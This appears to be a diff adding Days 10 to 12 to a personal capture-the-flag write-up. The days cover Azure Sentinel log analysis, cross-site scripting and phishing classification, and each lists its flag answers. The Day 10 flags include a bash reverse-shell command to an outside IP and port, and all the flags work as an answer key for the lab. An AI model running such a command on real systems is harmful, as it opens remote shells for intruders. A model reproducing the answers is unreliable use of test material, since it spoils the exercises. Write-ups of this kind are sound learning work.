@@ -111,3 +111,47 @@ THM{Cr4ck1n6_z1p$_1s_34$yyyy}
 ***
 
 # Day 10.
+In this room we got to use Azure Sentinel where we view the logs by running queries, this process utilises a more analyst perspective wehre we categorise the severity of problems too. We just modify search filters and find server logs to grant the flag. This day was put off quite a while as the labs didn't seem to be working too well. 
+
+## Flags 
+```
+10
+High
+4
+malicious_mod.ko
+/bin/bash -i >& /dev/tcp/198.51.100.22/4444 0>&1
+172.16.0.12
+203.0.113.45
+deploy
+```
+
+***
+
+# Day 11.
+Today's challenge room required us to delve into Cross-Site Scripting (XSS) and exploiting it over a webpage given to us. Mutating payloads to gain access and make the server execute commands as we wish. We also learnt the differences between reflected and stored XSS and how we can protect and exploit against this system of attack.
+
+## Flags
+```
+stored
+THM{Evil_Bunny}
+THM{Evil_Stored_Egg}
+```
+
+***
+
+# Day 12.
+This room had us delve into phishing and how it can be used as a social engineering tactic to gain access into operations and corportate systems. This day had us classify emails as spam or phishing and classify the type of social engineering going on there, we delved into tyopsquatting, spoofing and punycode as well as impersonation. 
+
+## Flags
+```
+THM{yougotnumber1-keep-it-going}
+THM{nmumber2-was-not-tha-thard!}
+THM{Impersonation-is-areal-thing-keepIt}
+THM{Get-back-SOC-mas!!}
+THM{It-was-just-a-sp4m!!}
+THM{number6-is-the-last-one!-DX!}
+```
+
+***
+
+# Day 13.
